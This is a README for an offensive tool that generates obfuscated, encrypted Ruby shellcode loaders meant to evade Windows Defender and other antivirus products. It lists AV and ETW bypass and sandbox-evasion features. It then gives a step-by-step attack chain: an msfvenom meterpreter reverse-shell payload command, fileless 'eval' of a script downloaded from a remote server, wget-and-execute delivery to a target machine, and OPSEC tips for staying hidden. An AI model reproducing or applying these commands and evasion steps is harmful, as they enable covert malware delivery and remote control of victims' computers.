### Invoke-Ruby-ShellCodeLoader.rb
--------------------------------------
'Invoke-Ruby-ShellCodeLoader' is a shellcode loader script generator that aims to bypass AV solutions such as Windows Defender.
It generates an obfuscated and encrypted shellcode loader (Ruby script) that implements several antivirus bypass and defense evasion techniques.

#### FEATURES
  - Shellcode injection into the memory of the current process (Ruby)
  - Shellcode encryption (XOR)
  - Script obfuscation (randomized function and variable names + nested payloads with reflective loading)
  - ETW bypass in user-mode (patching method / EtwEventWrite function)
  - Dynamic API resolution (via GetProcAddress + hash-based API resolution)
  - Basic sandbox detection and evasion (Terminates execution if a 'sleep acceleration' is detected)
  - Compatible with shellcodes of multiple C2 frameworks such as Metasploit and Havoc

#### USAGE
- STEP 1. Generate an obfuscated shellcode loader (Ruby script) using a shellcode (in Ruby format) from your preferred C2 framework as input.  
          <i/>Note: Tools like "SUPERNOVA" can be used to convert a raw shellcode into the ruby format (https://github.com/nickvourd/Supernova)</i>
```
Basic example (with Metasploit)
-------------------------------
$> msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread LHOST=<IP-address> LPORT=443 -a x64 -f ruby -o ruby-shellcode.bin
Note: remove the beginning of the shellcode file (e.g. "buf[]=") and only keep the shellcode content in ruby (e.g. "\x56\x48\x89\...") in the file "ruby-shellcode.bin"

C:\path\ruby> ruby.exe .\Invoke-Ruby-ShellCodeLoader.rb ".\ruby-shellcode.bin" ".\obfuscated_shellcodeloader.rb"
```

- STEP 2. Multiple options exist to download & execute the obfuscated shellcode loader (Ruby script) on a target Windows computer

  - Option A: Utilize a portable Ruby interpreter (https://rubyinstaller.org) + Fileless delivery of the obfuscated shellcode loader (Ruby script) 
```
1 - Download a portable Ruby interpreter with a good reputation.
    Example:
    PS C:\temp> wget -uri https://X.X.X.X/Ruby34-x64.zip -OutFile C:\temp\ruby.zip
    PS C:\temp> tar -xf .\ruby.zip

2 - Download from a remote web server and execute directly in memory the obfuscated shellcode loader script on the target Windows machine using Ruby.
    This fileless delivery technique enhances stealth and helps evade static antivirus detection.
    Example:
    --------
    C:\temp\ruby> type .\Ruby-fileless-delivery.rb
    require 'open-uri'
    url = 'http://website/obfuscated_shellcodeloader.rb'
    eval(URI.open(url).read)

    C:\temp\ruby> ruby.exe .\Ruby-fileless-delivery.rb 
```
  - Option B: Utilize a portable Ruby interpreter (https://rubyinstaller.org) + Download the obfuscated shellcode loader (Ruby script) locally before execution.
```
1 - Download a portable Ruby interpreter with a good reputation.
    Example:
    PS C:\temp> wget -uri https://X.X.X.X/Ruby34-x64.zip -OutFile C:\temp\ruby.zip
    PS C:\temp> tar -xf .\ruby.zip

2 - Download and store the obfuscated shellcode loader script locally on disk before executing it with Ruby.
    While obfuscation and encryption help evade static analysis by most antivirus solutions, this approach may offer reduced stealth compared to in-memory execution.
    Example:
    --------
    C:\temp\ruby> powershell -c "wget -uri http://X.X.X.X/obfuscated_shellcodeloader.rb -OutFile C:\temp\ruby\obfuscated_shellcodeloader.rb"
    C:\temp\ruby> ruby.exe .\obfuscated_shellcodeloader.rb
```
  - Option C: Utilize Ocra or Ruby Packer (rubyc) to bundle the obfuscated shellcode loader Ruby script into a single executable (e.g. script.exe) and then download and execute it on a target Windows computer
```
1 - Utilize Ocra or Ruby Packer (rubyc) to bundle the obfuscated shellcode loader Ruby script into a single executable (e.g. script.exe)
    + [Ocra] "ruby.exegem install ocra" and then "ruby.exe ocra .\test\shellcode_loader.rb"
    + [Ruby Packer (rubyc)] https://github.com/pmq20/ruby-packer/releases/tag/windows-x64

2 - Download and execute the obfuscated shellcode loader "script.exe" on a target Windows computer
    The obfuscation and encryption allow to evade static analysis by most antivirus solutions, though this method may offer reduced stealth compared to in-memory execution.
    Example:
    --------
    C:\temp> powershell -c "wget -uri http://X.X.X.X/script.exe -OutFile C:\temp\script.exe"
    C:\temp> script.exe
```

#### OPSEC advices
- Remove all existing comments in the script (loader template) before generating your obfuscated shellcode loader.
- When possible use fileless delivery technique to enhance stealth and evade static antivirus detection.
  
#### LICENSE
  - GNU General Public License v3.0
